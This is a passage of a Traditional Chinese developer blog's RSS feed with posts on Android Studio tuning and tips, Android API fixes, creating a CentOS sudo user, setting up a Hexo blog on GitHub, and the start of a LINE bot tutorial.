+<p><code>android:layout_gravity</code> 是用來設置該 view 相對於父 view 的位置。比如一個 button 在 LinearLayout 裡，你想讓該 button 在 LinearLayout 裡是靠左、靠右等位置。</p>]]></content></item><item><title>解決 Android Studio 卡頓的問題</title><link>https://blackmaple.me/%E8%A7%A3%E6%B1%BAandroid-studio%E5%8D%A1%E9%A0%93%E7%9A%84%E5%95%8F%E9%A1%8C/</link><pubDate>Sat, 20 Jan 2018 13:01:25 +0000</pubDate><guid>https://blackmaple.me/%E8%A7%A3%E6%B1%BAandroid-studio%E5%8D%A1%E9%A0%93%E7%9A%84%E5%95%8F%E9%A1%8C/</guid><description>問題描述 在使用 Macbook Pro 13 2017 開發案子，發現 Android Studio 會常常出現卡頓。
+解決辦法 上網查了一下，發現不少人都有這種狀況。問題好像是出在 Android Studio 的啟動參數限制了 JVM 獲得足夠的記憶體，導致了運行時只能頻繁的與磁盤交換。 因此我們要修改一下 Android Studio 的 JVM 參數文件，他的問位置在：
+/Applications/Android\ Studio.app/Contents/bin/studio.vmoptions 在我的電腦上，參數預設是：
+-Xms256m -Xmx1280m -XX:ReservedCodeCacheSize=240m -XX:+UseCompressedOops 在修改重要設定檔之前，建議先做備份：
+cd /Applications/Android\ Studio.app/Contents/bin/ cp studio.vmoptions studio.vmoptions.bak 以上為 bash 指令，請打開 terminal 輸入。
+第一句是移動到存放 studio.vmoptions 的資料夾底下 第二句是將 studio.vmoptions 複製一份備份，並將其命名為 studio.vmoptions.bak
+然後修改 studio.vmoptions 成這樣：
+-Xms512m -Xmx2048m -XX:ReservedCodeCacheSize=768m -XX:+UseCompressedOops 如果覺得你記憶體足夠大，可以將 -Xmx 後面的數字改更大。我的電腦為記憶體為 8G，因此我設 2048m。</description><content type="html"><![CDATA[<h2 id="問題描述">問題描述</h2>
+<p>在使用 Macbook Pro 13 2017 開發案子，發現 Android Studio 會常常出現卡頓。</p>
+<!-- raw HTML omitted -->
+<h2 id="解決辦法">解決辦法</h2>
+<p>上網查了一下，發現不少人都有這種狀況。問題好像是出在 Android Studio 的啟動參數限制了 JVM 獲得足夠的記憶體，導致了運行時只能頻繁的與磁盤交換。
+因此我們要修改一下 Android Studio 的 JVM 參數文件，他的問位置在：</p>
+<pre><code>/Applications/Android\ Studio.app/Contents/bin/studio.vmoptions
+</code></pre><p>在我的電腦上，參數預設是：</p>
+<pre><code>-Xms256m
+-Xmx1280m
+-XX:ReservedCodeCacheSize=240m
+-XX:+UseCompressedOops
+</code></pre><p>在修改重要設定檔之前，建議先做備份：</p>
+<pre><code>cd /Applications/Android\ Studio.app/Contents/bin/
+cp studio.vmoptions studio.vmoptions.bak
+</code></pre><p>以上為 bash 指令，請打開 terminal 輸入。</p>
+<p>第一句是移動到存放 studio.vmoptions 的資料夾底下
+第二句是將 studio.vmoptions 複製一份備份，並將其命名為 studio.vmoptions.bak</p>
+<p>然後修改 studio.vmoptions 成這樣：</p>
+<pre><code>-Xms512m
+-Xmx2048m
+-XX:ReservedCodeCacheSize=768m
+-XX:+UseCompressedOops
+</code></pre><p>如果覺得你記憶體足夠大，可以將 <code>-Xmx</code> 後面的數字改更大。我的電腦為記憶體為 8G，因此我設 2048m。</p>
+]]></content></item><item><title>Android Studio 技巧整理</title><link>https://blackmaple.me/android-studio%E6%8A%80%E5%B7%A7%E6%95%B4%E7%90%86/</link><pubDate>Sat, 13 Jan 2018 13:13:32 +0000</pubDate><guid>https://blackmaple.me/android-studio%E6%8A%80%E5%B7%A7%E6%95%B4%E7%90%86/</guid><description>&lt;p>最近開始研究 Android Studio，得知一些可以增加開發速度的小技巧，因此在這邊做一下記錄。&lt;/p></description><content type="html"><![CDATA[<p>最近開始研究 Android Studio，得知一些可以增加開發速度的小技巧，因此在這邊做一下記錄。</p>
+<h2 id="live-templates">Live Templates</h2>
+<p><code>Live Templates</code>：程式碼快速補全模板</p>
+<p>這邊列出一些比較常見的 Live Templates，有興趣的人可以自行深入了解。</p>
+<ul>
+<li><code>newInstance</code> - 在 Fragment 中生成 <code>newInstance</code> 方法</li>
+<li><code>Toast</code> - 生成 <code>Toast.makeText(context, &quot;&quot;, Toast.LENGTH_SHORT).show();</code></li>
+<li><code>fbc</code> - 生成 findViewById</li>
+<li><code>const</code> - 定義一個 android style int 常數</li>
+<li><code>logd</code> - 生成 <code>Log.d(TAG, &quot;&quot;);</code></li>
+<li><code>logm</code> - Log 當前方法名稱和參數</li>
+<li><code>logr</code> - Log 當前方法結果</li>
+<li><code>logt</code> - 當前類生成 log tag</li>
+<li><code>psf</code> - public static final</li>
+<li><code>sout</code> - 印出一個字串到 System.out</li>
+<li><code>soutm</code> - 印出當前類名和方法到 System.out</li>
+<li><code>soutp</code> - 印出方法參數和返回值到 System.out</li>
+<li><code>visible</code> - 設置 view VISIBLE</li>
+<li><code>gone</code> - 設置 view GONE</li>
+<li><code>noInstance</code> - private 構造方法</li>
+</ul>
+<h2 id="android-studio-的自動生成">Android Studio 的自動生成</h2>
+<p>可以使用 Android Studio 自動幫你生成一些程式碼</p>
+<ul>
+<li><code>&lt;expr&gt;.null</code> 轉換成 <code>if(&lt;expr&gt; == null)</code></li>
+<li><code>&lt;expr&gt;.notnull</code> 轉換成 <code>if(&lt;expr&gt; != null)</code></li>
+<li><code>&lt;expr&gt;.var</code> 轉換成 <code>T name = &lt;expr&gt;</code></li>
+<li><code>&lt;expr&gt;.field</code> 會自動生成一個全局變數 <code>field = &lt;expr&gt;</code></li>
+<li><code>&lt;ArrayExpr&gt;.for</code> 轉換成 <code>for(T item : &lt;Arrayexpr&gt;)</code></li>
+<li><code>&lt;ArrayExpr&gt;.fori</code> 轉換成 <code>for(int i = 0; i &lt; &lt;Arrayexpr&gt;.length; i++)</code></li>
+<li><code>&lt;ArrayExpr&gt;.forr</code> 轉換成 <code>for(int i = &lt;Arrayexpr&gt;.length - 1; i &gt; 0 ; i--)</code></li>
+</ul>
+<h2 id="插件">插件</h2>
+<p>下面列出一些我正在使用的插件</p>
+<ol>
+<li>
+<p><strong>Android Drawable Importer</strong>
+為了適應所有 Android 螢幕的大小和密度，每個 Android 項目都會包含 drawable 資料夾。任何具備 Android 開發經驗的開發人員都知道，為了支持所有的螢幕尺寸，你必須給每個螢幕類型導入不同的 Drawalbe。Android Drawable Importer 插件能讓這項工作變得更容易。它可以減少導入縮放圖像到 Android 項目所需的工作量。 Android Drawable Importer 添加了一個在不同分辨率導入 Drawble 或縮放指定圖像到定義分辨率的選項。這個插件加速了開發人員的 Drawable 工作。</p>
+</li>
+<li>
+<p><strong>Lifecycle Sorter</strong>
+可以根據 Activity 或者 fragment 的生命週期對其生命週期方法位置進行先後排序，快捷鍵 Ctrl + alt + K。</p>
+</li>
+<li>
+<p><strong>.ignore</strong>
+我們都知道在 Git 中想要過濾掉一些不想提交的文件，可以把相應的文件添加到 .gitignore 中，而 .gitignore 這個 Android Studio 插件根據不同的語言來選擇模板，就不用自己在費事添加一些文件了，而且還有自動補全功能，過濾文件再也不要復製檔名了。我們做項目的時候，並不是所有文件都是要提交的，比如構建的 build 資料夾，本地配置文件，每個 Module 生成的 iml 文件，但是我們每次 add，commit 都會不小心把它們添加上去，而 gitignore 就是解決這種痛點的，如果你不想提交的檔案，就可以在創建項目的時候將這個檔案中添加即可，將一些通用的東西屏蔽掉。</p>
+</li>
+<li>
+<p><strong>Android Methods Count</strong>
+統計 Android 依賴庫中方法的總個數。 (一個 dex 只能接受的 65K 並不是指方法數超過 65K 而報的錯,而是指引用計數超過 65K)</p>
+</li>
+<li>
+<p><strong>jetbrains-wakatime</strong>
+紀錄在 Android Studio 上的工作時間。</p>
+</li>
+<li>
+<p><strong>Genymotion</strong>
+好用的 Android 模擬器，原生模擬器不堪用。</p>
+</li>
+<li>
+<p><strong>GsonFormat</strong>
+快速將 json 字串轉換成一個 Java Bean，免去我們根據 json 字符串手寫對應 Java Bean 的過程。</p>
+</li>
+<li>
+<p><strong>LayoutFormatter</strong>
+一鍵幫你將你的 XML 文件排版，並調整順序。</p>
+</li>
+</ol>
+<h2 id="快捷鍵">快捷鍵</h2>
+<p><a href="https://resources.jetbrains.com/storage/products/intellij-idea/docs/IntelliJIDEA_ReferenceCard.pdf">完整的快捷键指南</a></p>
+<h3 id="參考資料">參考資料</h3>
+<ul>
+<li><a href="https://github.com/nisrulz/android-tips-tricks">nisrulz/android-tips-tricks</a></li>
+<li><a href="https://ydmmocoo.github.io/2016/06/28/Android-Studio%E6%8F%92%E4%BB%B6%E6%95%B4%E7%90%86/">Android Studio插件整理</a></li>
+</ul>]]></content></item><item><title>如何在 Centos 7 創建一個 Sudo user</title><link>https://blackmaple.me/how-to-create-a-sudo-user-on-centos-quickstart/</link><pubDate>Sun, 31 Dec 2017 00:20:47 +0000</pubDate><guid>https://blackmaple.me/how-to-create-a-sudo-user-on-centos-quickstart/</guid><description>&lt;ol>
+&lt;li>以 root 身份登錄到你的伺服器。
+&lt;pre>&lt;code class="language-shell=" data-lang="shell=">ssh root@server_ip_address
+&lt;/code>&lt;/pre>&lt;/li>
+&lt;/ol></description><content type="html"><![CDATA[<ol>
+<li>以 root 身份登錄到你的伺服器。
+<pre><code class="language-shell=" data-lang="shell=">ssh root@server_ip_address
+</code></pre></li>
+</ol>
+<ol start="2">
+<li>
+<p>使用 adduser 指令將新用戶添加到你的系統</p>
+<p>將 username 替換為你要創建的用戶</p>
+<pre><code class="language-shell=" data-lang="shell=">adduser username
+</code></pre><ul>
+<li>使用 passwd 指令更新 user 密碼</li>
+</ul>
+<pre><code class="language-shell=" data-lang="shell=">passwd username
+</code></pre><ul>
+<li>設置 user 的密碼的顯示訊息</li>
+</ul>
+<pre><code class="language-shell=" data-lang="shell=">Set password prompts:
+Changing password for user username.
+New password:
+Retype new password:
+passwd: all authentication tokens updated successfully.
+</code></pre></li>
+<li>
+<p>使用 usermod 指令將用戶添加到 wheel 中。</p>
+<pre><code class="language-shell=" data-lang="shell=">usermod -aG wheel username
+</code></pre><p>默認情況下，在 CentOS 上，wheel 的成員具有 sudo 權限。</p>
+</li>
+<li>
+<p>在 user 上測試 sudo 訪問權限</p>
+<ul>
+<li>使用該 su 命令切換到新的 user 。</li>
+</ul>
+<pre><code class="language-shell=" data-lang="shell=">su - username
+</code></pre><ul>
+<li>作為 user ，請通過將“sudo”添加到要以超級用戶權限運行的命令來驗證是否可以使用 sudo。</li>
+</ul>
+<p>例如，您可以列出根目錄的內容，/ 通常只能由 root 用戶訪問。</p>
+<pre><code class="language-shell=" data-lang="shell=">sudo ls -la /
+</code></pre><ul>
+<li>第一次使用 sudo 時，系統會提示你輸入 user 的密碼。輸入密碼以繼續。</li>
+</ul>
+<pre><code class="language-shell=" data-lang="shell=">Output:
+[sudo] password for username:
+</code></pre><p>如果您前面操作正確，則使用 sudo 來執行的指令會以 root 權限執行。</p>
+</li>
+</ol>]]></content></item><item><title>[Android] 在 static method 中取得 String Resource</title><link>https://blackmaple.me/%E5%9C%A8-static-method-%E5%8F%96%E5%BE%97-string-resourse/</link><pubDate>Thu, 21 Dec 2017 19:29:30 +0000</pubDate><guid>https://blackmaple.me/%E5%9C%A8-static-method-%E5%8F%96%E5%BE%97-string-resourse/</guid><description>&lt;h2 id="遇到問題">遇到問題&lt;/h2>
+&lt;p>最近在寫一個 Singleton 的類別時，遇到需要透過 Resource id 取得 string 的需求，原本想用 context.getString(int resId) 的方式取得，但發現 Context 不適合被 static 成員或類別引用，會導致內存泄露。&lt;/p></description><content type="html"><![CDATA[<h2 id="遇到問題">遇到問題</h2>
+<p>最近在寫一個 Singleton 的類別時，遇到需要透過 Resource id 取得 string 的需求，原本想用 context.getString(int resId) 的方式取得，但發現 Context 不適合被 static 成員或類別引用，會導致內存泄露。</p>
+<p>static 成員生命週期會隨著 app 開始到結束。
+如果引用到 Context、Activity，會導致 Context、Activity 也跟著無法被回收，導致內存泄露。</p>
+<h2 id="解決辦法">解決辦法</h2>
+<p>使用 Resources.getSystem().getString(int resId) 來取得 String。</p>
+<h2 id="參考資料">參考資料</h2>
+<p><a href="https://segmentfault.com/q/1010000008131979">https://segmentfault.com/q/1010000008131979</a>
+<a href="https://stackoverflow.com/questions/3822732/android-getstringr-string-in-static-method">https://stackoverflow.com/questions/3822732/android-getstringr-string-in-static-method</a></p>]]></content></item><item><title>Android: getColor(int id) deprecated</title><link>https://blackmaple.me/android-getcolor-deprecated/</link><pubDate>Wed, 20 Dec 2017 12:27:18 +0000</pubDate><guid>https://blackmaple.me/android-getcolor-deprecated/</guid><description>&lt;p>從 Android 6 開始，一個新的 getColor() 方法出現，舊的 Resource.getColor(int id) 則被廢棄。&lt;/p></description><content type="html"><![CDATA[<p>從 Android 6 開始，一個新的 getColor() 方法出現，舊的 Resource.getColor(int id) 則被廢棄。</p>
+<p>新方法：</p>
+<pre><code class="language-java=" data-lang="java=">context.getColor(id);
+</code></pre><p>如果要兼容 Android 6 以下的版本，建議使用 Support Library v4 的方法：</p>
+<pre><code class="language-java=" data-lang="java=">ContextCompat.getColor(context, R.color.your_color);
+</code></pre><p>此方法來自官方 JavaDoc 的描述：</p>
+<pre><code>Returns a color associated with a particular resource ID
+
+Starting in M, the returned color will be styled for the specified Context's theme.
+</code></pre>
+<p>這是 ContextCompat.getColor() 的程式碼：</p>
+<pre><code class="language-java=" data-lang="java=">public static final int getColor(Context context, @ColorRes int id) {
+    if (Build.VERSION.SDK_INT &gt;= 23) {
+        return context.getColor(id);
+    } else {
+        return context.getResources().getColor(id);
+    }
+}
+</code></pre><p>如果不想導入 Support Library v4，可以直接參考上面的寫法。</p>]]></content></item><item><title>[Android] Error：Fragment already added</title><link>https://blackmaple.me/error-fragment-already-added/</link><pubDate>Tue, 19 Dec 2017 21:46:44 +0000</pubDate><guid>https://blackmaple.me/error-fragment-already-added/</guid><description>&lt;h2 id="遇到狀況">遇到狀況&lt;/h2>
+&lt;pre>&lt;code>java.lang.IllegalStateException: Fragment already added
+&lt;/code>&lt;/pre></description><content type="html"><![CDATA[<h2 id="遇到狀況">遇到狀況</h2>
+<pre><code>java.lang.IllegalStateException: Fragment already added
+</code></pre>
+<h2 id="原因">原因</h2>
+<p>Fragment 在一些狀況不會正常移除</p>
+<h2 id="原本程式碼">原本程式碼</h2>
+<pre><code class="language-java=" data-lang="java=">FragmentTransaction transaction = getFragmentManager().beginTransaction();
+transaction.replace(R.id.fragment_container, newFragment);
+transaction.addToBackStack(null);
+transaction.commit();
+</code></pre><h2 id="解決辦法">解決辦法</h2>
+<p>因為replace有時會出現問題，因此在使用之前先確認Fragment是否被Added。</p>
+<pre><code class="language-java=" data-lang="java=">if(mFragment.isAdded())
+{
+     return; //or return false/true, based on where you are calling from
+}
+</code></pre><h2 id="後來程式碼">後來程式碼</h2>
+<pre><code class="language-java=" data-lang="java=">FragmentTransaction transaction = getFragmentManager().beginTransaction();
+if (newFragment.isAdded()) {
+    return;
+}
+transaction.replace(R.id.fragment_container, newFragment);
+transaction.addToBackStack(null);
+transaction.commit();
+</code></pre>]]></content></item><item><title>Android: NotificationCompat 與 Notification 差別</title><link>https://blackmaple.me/android-notificationcompat-vs-notification/</link><pubDate>Tue, 19 Dec 2017 21:23:54 +0000</pubDate><guid>https://blackmaple.me/android-notificationcompat-vs-notification/</guid><description>&lt;p>Notification.Builder 是 Android 3.0 (API 11) 引入的。如要兼容低版本，可以使用 Support V4 包提供的 NotificationCompat.Builder。&lt;/p></description><content type="html">&lt;p>Notification.Builder 是 Android 3.0 (API 11) 引入的。如要兼容低版本，可以使用 Support V4 包提供的 NotificationCompat.Builder。&lt;/p>
+&lt;p>Android 3.0 以上選擇 Notification
+Android 3.0 以下選擇 NotificationCompat&lt;/p></content></item><item><title>Hexo+GitHub，新手也可以快速建立部落格</title><link>https://blackmaple.me/hexo-tutorial/</link><pubDate>Tue, 19 Dec 2017 16:43:39 +0000</pubDate><guid>https://blackmaple.me/hexo-tutorial/</guid><description>&lt;p>之前使用過 Wordpress 一段時間，但發現了 Hexo 更方便，所以這邊來紀錄一下使用過程。&lt;/p></description><content type="html"><![CDATA[<p>之前使用過 Wordpress 一段時間，但發現了 Hexo 更方便，所以這邊來紀錄一下使用過程。</p>
+<h2 id="hexo-優點">Hexo 優點</h2>
+<ol>
+<li>因為建立於本地端，所以可以更方便離線進行編輯</li>
+<li>可以不需要一台伺服器</li>
+<li>文章編輯使用 Markdown 語法，更方便、通用、容易上手</li>
+<li>部署於 GitHub 上，完全零成本</li>
+<li>中文兼容性高</li>
+<li>可快速搭建優質的部落格</li>
+</ol>
+<h2 id="開始之前">開始之前</h2>
+<p>建議先了解，cmd 或是 bash 指令
+之後所有指令以 &lsquo;$&rsquo; 開頭，皆為 bash 指令
+​ <br>
+有任何問題，都歡迎留言詢問唷～</p>
+<h2 id="建制步驟">建制步驟</h2>
+<h3 id="安裝-nodejs">安裝 Node.js</h3>
+<p>去 <a href="https://nodejs.org/en/">Node.js</a> 官網下載安裝</p>
+<h3 id="安裝-hexo-git">安裝 Hexo Git</h3>
+<pre><code class="language-shell=" data-lang="shell=">$ npm install hexo-deployer-git --save
+</code></pre><h3 id="安裝-hexo">安裝 Hexo</h3>
+<p>使用 npm 來安裝 hexo (須先安裝 Node.js)</p>
+<pre><code class="language-shell=" data-lang="shell=">$ npm install hexo-cli -g
+</code></pre><p>安裝成功後，輸入以下指令可查看版本</p>
+<pre><code class="language-shell=" data-lang="shell=">$ hexo version
+</code></pre><p>接下來即可初始化我們的部落格了</p>
+<pre><code class="language-shell=" data-lang="shell=">$ hexo init blog       # 初始化 blog
+$ cd blog              # 移動到剛創建的 blog 資料夾裡
+$ npm install		# 安裝相關套件
+</code></pre><h3 id="將-hexo-配置到-github">將 Hexo 配置到 GitHub</h3>
+<p>去 <a href="https://github.com/">GitHub</a> 官網登入。
+新增一個倉庫(Repositories)</p>
+<p><img src="https://i.imgur.com/hC3eCNY.png" alt=""></p>
+<p>倉庫名稱為 yourname.github.io</p>
+<blockquote>
+<p>上面的 yourname 請替換成你 GitHub 的帳號名稱</p>
+</blockquote>
+<p><img src="https://i.imgur.com/72ZXHCJ.png" alt=""></p>
+<p>看到這頁代表即可退出</p>
+<p><img src="https://i.imgur.com/tLiMyDf.png" alt=""></p>
+<p>再來到 blog 資料夾下找一個 _config.yml 的檔案，這是 Hexo 的全域配置文件
+<img src="https://i.imgur.com/OjTrXMX.png" alt=""></p>
+<p>開啟之後，拉到檔案最底部，可以看到</p>
+<pre><code class="language-shell=" data-lang="shell=">deploy:
+  type: 
+</code></pre><p>將以下資訊對應輸入</p>
+<pre><code class="language-shell=" data-lang="shell=">deploy:
+  type: git
+  repository: http://github.com/yourname/yourname.github.io.git
+  branch: master
+</code></pre><blockquote>
+<p>設定中的 &ldquo;:&rdquo; 後一定要有一個空格
+將上面的 yourname 改成妳的 GitHub 帳號名稱</p>
+</blockquote>
+<p>產生靜態文件後，部署上 GitHub</p>
+<pre><code class="language-shell=" data-lang="shell=">$ hexo d -g
+</code></pre><p>再來就可以上 <a href="https://yourname.github.io/">https://yourname.github.io/</a> 查看是否部署成功
+成功之後，就可以開始做一些優化和寫文章啦。</p>
+<blockquote>
+<p>將上面的 yourname 替換成你 GitHub 的帳號名稱</p>
+</blockquote>
+<h2 id="hexo-配置檔介紹">Hexo 配置檔介紹</h2>
+<p>_config.yml 是 hexo 的預設設定黨，其設定是用 yaml 格式編寫。</p>
+<p><strong>yaml 檔裡，&quot;:&ldquo;後一定要有一個空格</strong>
+下面是 hexo 的預設配置，可以自修改。</p>
+<pre><code class="language-yaml=" data-lang="yaml="># Site
+title: /標題(會顯示在網頁標題與頁首)/
+subtitle: /子標題(顯示在頁首)/
+description: /內容描述(給搜尋引擎看的)/
+author: /作者(顯示在頁尾)/
+language: /網站預設語言(台灣:zh-tw)/
+timezone: /時區(預設使用你電腦的時區)/
+
+# URL
+url: /網站的網域位址/
+root: /網站根目錄/
+permalink: /文章目錄(預設使用 YYYY\MM\DD\文章名稱)/
+
+# Extensions
+theme: /網站的佈景主題/
+       (可以到&quot;https://hexo.io/themes/&quot;下載喜歡的佈景放置到 theme 目錄裡)
+
+# Deployment
+deploy:
+    type: /發佈型態/ 例如(git、heroku、rsync、openshift、ftpsync)
+    repository: /部署位置/ 例如(git@github.com:帳號/REPO名.git)
+    branch: /分支/ 例如(master、gh-pages)
+    message: /部署訊息/
+</code></pre><h2 id="使用-next-主題">使用 NexT 主題</h2>
+<p>本站使用主題為 NexT.Pisces 主題。
+如何使用，可以參考 <a href="http://theme-next.iissnan.com/getting-started.html">官方教學文件</a>，上面寫的很詳細，而且是中文的教學！</p>
+<h2 id="發布文章">發布文章</h2>
+<p>創建文章</p>
+<pre><code class="language-shell=" data-lang="shell=">$ hexo new [postName]
+</code></pre><p><em>備註：將 [postName] 換成你的文章名稱 (以英文尤佳)</em></p>
+<p>前往 source / _post 資料夾中，打開 [postName].md 文件，在最下面新增 <a href="https://wastemobile.gitbooks.io/gitbook-chinese/content/format/markdown.html">Markdown</a> 語法的內容。</p>
+<p>修改完後，執行以下指令，就可以將新的變更發佈到部落格上囉！</p>
+<pre><code class="language-shell=" data-lang="shell=">$ hexo d -g    # d = 部署, g = 生成
+</code></pre><p>等一段時間，就可以看到你剛剛打的文章囉！</p>
+<p>如果你要先在本地端看看效果，也可以改成以下指令</p>
+<pre><code class="language-shell=" data-lang="shell=">$ hexo server
+</code></pre><p><strong>不熟悉 Markdown 的人</strong>，可以去看看這篇 <a href="https://wastemobile.gitbooks.io/gitbook-chinese/content/format/markdown.html">Markdown 語法教學</a></p>
+<p>如果想<strong>嘗試編寫 Markdown</strong>，或是想<strong>找一個好用的Markdown 編輯器</strong>，可以嘗試使用 <a href="https://hackmd.io/recent">HackMD</a>。</p>
+<h2 id="刪除文章">刪除文章</h2>
+<p>首先進入到 source / _post 資料夾中，找到 helloworld.md 文件，在本地直接執行刪除。
+<img src="https://i.imgur.com/QSV6q2a.png" alt=""></p>
+<p>執行以下指令</p>
+<pre><code class="language-shell=" data-lang="shell=">$ hexo clean    # 清除快取檔案和已產生的靜態檔案。
+$ hexo d -g     # d = deploy, g = generate
+</code></pre><p>等一段時間，就會發現那篇文章已經消失囉！</p>
+<h2 id="使用第三方擴充服務">使用第三方擴充服務</h2>
+<p>本站有使用以下第三方服務，有興趣可以去看看。</p>
+<ol>
+<li><a href="http://theme-next.iissnan.com/third-party-services.html#disqus">DISQUS</a>：評論系統</li>
+<li><a href="http://theme-next.iissnan.com/third-party-services.html#local-search">Local Search</a>：搜尋系統</li>
+<li><a href="https://skylake.tw/2017/09/29/hexo-buildup/#wen-zhang-zhai-yao-xian-shi-shi-yong">文章摘要顯示使用</a>：優化主頁文章摘要</li>
+<li><a href="http://theme-next.iissnan.com/third-party-services.html#analytics-busuanzi">不蒜子统计</a>：瀏覽量統計</li>
+</ol>
+<h2 id="客製化設定">客製化設定</h2>
+<p>本站參考了以下幾篇文章，修改了一些顯示效果，有興趣可以看看。</p>
+<ol>
+<li><a href="http://shenzekun.cn/hexo%E7%9A%84next%E4%B8%BB%E9%A2%98%E4%B8%AA%E6%80%A7%E5%8C%96%E9%85%8D%E7%BD%AE%E6%95%99%E7%A8%8B.html#6-%E4%BF%AE%E6%94%B9%E6%96%87%E7%AB%A0%E5%BA%95%E9%83%A8%E7%9A%84%E9%82%A3%E4%B8%AA%E5%B8%A6-%E5%8F%B7%E7%9A%84%E6%A0%87%E7%AD%BE">修改文章底部的那个带#号的标签</a></li>
+<li><a href="https://reuixiy.github.io/technology/computer/computer-aided-art/2017/06/09/hexo-next-optimization.html#%E5%8A%A8%E6%80%81%E8%83%8C%E6%99%AF">動態背景</a></li>
+</ol>
+<h2 id="登錄搜尋引擎">登錄搜尋引擎</h2>
+<p>如果只支援 Google 可以參考這篇 <a href="http://theme-next.iissnan.com/third-party-services.html#google-webmaster-tools">Next+Google Webmaster tools</a>，
+如果也想支援百度，可以參考這篇 <a href="http://www.helloshawn.cn/2016/Hexo-Next%E4%B8%BB%E9%A2%98%E5%8D%9A%E5%AE%A2%E6%8F%90%E4%BA%A4%E7%99%BE%E5%BA%A6%E8%B0%B7%E6%AD%8C%E6%94%B6%E5%BD%95.html#%E9%AA%8C%E8%AF%81%E7%BD%91%E7%AB%99">Hexo+Next主题博客提交百度谷歌收录</a>。</p>
+<pre><code>GitHub 會擋百度爬蟲。如果你建在 GitHub 上，百度會搜尋不到
+</code></pre>
+<h2 id="seo-優化">SEO 優化</h2>
+<p>可以參考這篇，<a href="http://blog.mobing.net/content/hexo/hexo-next-seo.html">基于Hexo中Next主题的SEO优化指南</a>。</p>
+<h2 id="強化-markdown-renderer">強化 Markdown renderer</h2>
+<p>執行以下指令，將原生 Markdown 改為 Markdown-it</p>
+<pre><code class="language-shell=" data-lang="shell=">$ npm un hexo-renderer-marked --save    # 刪除原生 Markdown
+$ npm i hexo-renderer-markdown-it --save    # 安裝 Markdown-it
+</code></pre><h2 id="新增標籤頁">新增標籤頁</h2>
+<p>可以參考 NexT 官網的這篇教學 <a href="http://theme-next.iissnan.com/theme-settings.html#tags-page">添加「标签」页面</a>。</p>
+<h2 id="新增分類頁">新增分類頁</h2>
+<p>可以參考 NexT 官網的這篇教學 <a href="http://theme-next.iissnan.com/theme-settings.html#categories-page">添加「分类」页面</a>。</p>
+<h2 id="新增關於頁">新增關於頁</h2>
+<p>可以參考 NexT 官網的這篇教學 <a href="http://www.5isjyx.com/coding/201704/hexonextabout.html">Hexo about页面怎么写 Next关于页面怎么设置</a>。</p>
+<h2 id="性能優化">性能優化</h2>
+<p>性能優化最主要的就是壓縮網頁大小，一開始有試過使用大多數人推的 <code>hexo-neat</code>，但結果一直失敗QwQ
+因此決定改用 gulp 來做壓縮。</p>
+<p>可以參考這篇：
+<a href="https://www.voidking.com/dev-hexo-gulp/">Hexo使用Gulp压缩静态资源</a></p>
+<h2 id="參考資料">參考資料</h2>
+<p><a href="https://skylake.tw/2017/09/29/hexo-buildup/#rang-nex-t-zhu-ti-de-list-bu-zhi-you-yuan-xing">Hexo部落格建立筆記 | SkyLake&rsquo;s Blog</a>
+<a href="https://hexo.io/zh-tw/index.html">Hexo 官方網站</a>
+<a href="http://theme-next.iissnan.com/">NexT 官方網站</a></p>]]></content></item><item><title>LineBot+Python，輕鬆建立聊天機器人</title><link>https://blackmaple.me/line-bot-tutorial/</link><pubDate>Tue, 19 Dec 2017 16:39:52 +0000</pubDate><guid>https://blackmaple.me/line-bot-tutorial/</guid><description>&lt;blockquote>
+&lt;p>本教學由 &lt;strong>北科程式設計研究社&lt;/strong> 所屬
+喜歡這篇教學，可以到我的 &lt;a href="https://github.com/yaoandy107/line-bot-tutorial">Github&lt;/a> 上面給我一顆 Star
+[name=姚韋辰]&lt;/p>
+&lt;/blockquote>
+&lt;p>本教程介紹如何使用 Python LINE Bot SDK 在 Heroku 上架設一個簡單的回話機器人。&lt;/p></description><content type="html"><![CDATA[<blockquote>
+<p>本教學由 <strong>北科程式設計研究社</strong> 所屬
+喜歡這篇教學，可以到我的 <a href="https://github.com/yaoandy107/line-bot-tutorial">Github</a> 上面給我一顆 Star
+[name=姚韋辰]</p>
+</blockquote>
+<p>本教程介紹如何使用 Python LINE Bot SDK 在 Heroku 上架設一個簡單的回話機器人。</p>
+<p>如果您想以另一種語言架設範例 bot，請參閱以下  LINE Bot SDK repositories。</p>
+<ul>
+<li><a href="https://github.com/line/line-bot-sdk-php">PHP</a></li>
+<li><a href="https://github.com/line/line-bot-sdk-go">Go</a></li>
+<li><a href="https://github.com/line/line-bot-sdk-perl">Perl</a></li>
+<li><a href="https://github.com/line/line-bot-sdk-ruby">Ruby</a></li>
+<li><a href="https://github.com/line/line-bot-sdk-python">Python</a></li>
+<li><a href="https://github.com/line/line-bot-sdk-nodejs">Node.js</a></li>
+</ul>
+<h2 id="在你開始之前">在你開始之前</h2>
+<p>確保您具有以下內容：</p>
+<ul>
+<li>擁有 Line 帳號</li>
+<li>擁有 <a href="https://www.heroku.com">Heroku</a> 帳戶（您可以免費創建一個）</li>
+</ul>
+<h2 id="建立-heroku-專案">建立 Heroku 專案</h2>
+<ol>
+<li>
+<p>登入 Heroku 後，
+在 <a href="https://dashboard.heroku.com/apps">Heroku</a> 頁面中，點選 New -&gt; Create New App</p>
+<p><img src="https://i.imgur.com/Y3njp7I.png" alt=""></p>
+</li>
+<li>
+<p>輸入自己喜歡的 App name ，然後點擊 Create app</p>
+<p><img src="https://i.imgur.com/WJ85jXR.png" alt=""></p>
+</li>
+</ol>
+<h2 id="創建-line-bot-頻道">創建 Line Bot 頻道</h2>
+<ol>
+<li>
+<p>進入 <a href="https://developers.line.me/console/">Line 控制台</a></p>
+<p><img src="https://i.imgur.com/vseYQt1.png" alt=""></p>
+</li>
+<li>
+<p>創建提供者</p>
+<p><img src="https://i.imgur.com/0tnYFBd.png" alt=""></p>
+</li>
+<li>
+<p>填入提供者名稱</p>
+<p><img src="https://i.imgur.com/2ne3H1F.png" alt=""></p>
+</li>
+<li>
+<p>點擊 Create</p>
+<p><img src="https://i.imgur.com/bdESW8G.png" alt=""></p>
+</li>
+<li>
+<p>點擊 Create Channel</p>
+<p><img src="https://i.imgur.com/F1nAWhK.png" alt=""></p>
+</li>
+<li>
+<p>填入 Bot 資訊</p>
+<p><img src="https://i.imgur.com/3wYFSvl.png" alt=""></p>
+</li>
+<li>
+<p>同意 Line 條款，並按 Create</p>
+<p><img src="https://i.imgur.com/WNzl4sL.png" alt=""></p>
+</li>
+<li>
+<p>選擇剛剛創建的 Bot</p>
+<p><img src="https://i.imgur.com/6ocsOBW.png" alt=""></p>
+</li>
+</ol>
+<h2 id="設定範例機器人">設定範例機器人</h2>
+<p>按照以下步驟架設一個回話機器人。</p>
+<ol>
